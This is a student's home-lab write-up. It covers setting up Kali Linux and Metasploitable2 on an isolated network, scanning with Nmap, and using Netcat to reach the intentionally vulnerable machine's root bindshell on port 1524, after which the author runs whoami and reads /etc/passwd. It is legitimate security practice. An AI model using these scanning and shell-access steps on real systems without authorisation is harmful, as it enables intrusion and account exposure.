# Home Lab: Network Scanning and Exploitation with Metasploitable2

**Date:** September 29, 2026

## Tools & Technologies

| Category | Tools |
|---|---|
| Operating Systems | Kali Linux, Metasploitable2 |
| Virtualization | UTM, QEMU |
| Network Scanning | Nmap |
| Network Connections | Netcat |
| Linux Commands | `ping`, `whoami`, `cat`, `qemu-img` |

## Objective

Create a safe and isolated lab using a vulnerable machine. The goal was to practise network scanning, find open services and understand how a vulnerable system can be accessed.

## Environment Setup

- Downloaded Metasploitable2 from the Rapid7 project via SourceForge.
- Converted the virtual disk from `.vmdk` to `.qcow2` using `qemu-img convert -f vmdk -O qcow2`.
- Created a virtual machine in UTM using x86_64 emulation because my Mac uses an ARM processor.
- Disabled UEFI boot and used Legacy BIOS because Metasploitable2 needs it.
- Set the network to **Host Only** to keep the lab separate from my home Wi-Fi and the internet.
- Created a separate Kali Linux machine called **Kali LAB** for this project.
- Connected both machines to the same isolated network.
- Tested the connection using `ping`. The result was **0% packet loss**.

## Network Scanning with Nmap

I started by scanning the Metasploitable2 machine.

**First command:**

`nmap -sV 192.168.128.3`

The scan stopped making progress during the ARP Ping Scan phase. After more than five minutes, it was still not finished.

**Solution:**

I tried a different command:

`nmap -sV -Pn -n -T4 192.168.128.3`

What the options mean:

- `-sV`: Detect service versions.
- `-Pn`: Skip host discovery.
- `-n`: Do not use DNS resolution.
- `-T4`: Use faster scan timing.

The scan finished in **52.70 seconds**.

The new options helped me complete the scan, but I did not confirm the exact cause of the first problem.

### Services Found

| Port | Service | Details |
|---|---|---|
| 1524/tcp | bindshell | Metasploitable root shell |
| 2121/tcp | FTP | ProFTPD 1.3.1 |
| 3306/tcp | MySQL | MySQL 5.0.51a |
| 5432/tcp | PostgreSQL | PostgreSQL 8.3 |
| 5900/tcp | VNC | Protocol 3.3 |
| 6667/tcp | IRC | UnrealIRCd |
| 8180/tcp | HTTP | Apache Tomcat/Coyote |

## Testing the Bindshell (Port 1524)

I used Netcat to connect to port 1524.

**Command:**

`nc 192.168.128.3 1524`

After connecting, I entered:

`whoami`

**Result:**

`root`

This showed that I had root access without using a username or password.

I then checked the system's user accounts.

**Command:**

`cat /etc/passwd`

I found several users, including:

- `root` — User ID 0
- `msfadmin` — User ID 1000
- `user` — Test account

This confirmed that the service allowed access with high privileges.

## Lessons Learned

- Open ports can show which services are running on a machine.
- Some vulnerable services can allow access without a username or password.
- Nmap options can help when a scan does not work as expected.
- Using an isolated network is important when testing vulnerable machines.
- A separate Kali Linux machine helps keep my normal environment unchanged.
- When a scan stops making progress, it is important to check the network and scan settings before trying again.

## Conclusion

In this lab, I created an isolated environment with Kali Linux and Metasploitable2.

I used Nmap to find open ports and services. I also used Netcat to connect to a vulnerable service and confirmed root access.

This project helped me practise basic network scanning, understand the risks of insecure services and improve my troubleshooting skills.
